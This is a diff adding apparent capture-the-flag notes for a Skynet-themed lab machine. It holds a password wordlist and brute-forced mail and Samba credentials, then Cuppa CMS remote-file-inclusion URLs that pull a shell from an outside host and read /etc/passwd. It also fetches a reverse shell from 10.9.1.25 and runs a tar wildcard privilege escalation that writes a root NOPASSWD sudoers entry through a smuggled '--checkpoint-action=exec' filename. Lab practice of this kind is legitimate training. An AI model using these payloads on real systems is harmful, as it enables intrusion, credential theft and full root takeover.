@@ -1,0 +1,62 @@
+A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+-Miles Dyson
+
+cyborg007haloterminator
+terminator22596
+terminator219
+terminator20
+terminator1989
+terminator1988
+terminator168
+terminator16
+terminator143
+terminator13
+terminator123!@#
+terminator1056
+terminator101
+terminator10
+terminator02
+terminator00
+roboterminator
+pongterminator
+manasturcaluterminator
+exterminator95
+exterminator200
+dterminator
+djxterminator
+dexterminator
+determinator
+cyborg007haloterminator
+avsterminator
+alonsoterminator
+Walterminator
+79terminator6
+1996terminator
+
+after bruteforcing squirrelmail :
+found password with user milesdyson:cyborg007haloterminator
+
+found samba password :
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+can login use milesdyson:)s{A&2Z=F^n_E.B`
+
+found important.txt :
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+
+found exploit on that cms.
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+revshell it.
+/alerts/alertConfigField.php?urlConfig=http://10.9.1.25:9000/revshell.php
+
+privesc :
+exploiting backup shell :
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
